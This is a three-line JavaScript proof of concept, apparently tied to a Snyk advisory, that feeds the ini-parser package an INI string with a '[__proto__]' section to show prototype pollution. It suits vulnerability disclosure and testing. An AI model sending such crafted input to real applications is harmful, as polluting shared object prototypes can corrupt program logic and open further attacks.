// https://snyk.io/vuln/SNYK-JS-INIPARSER-564122
  let a = require("ini-parser");
  a.parse("[__proto__]\npolluted=yes");
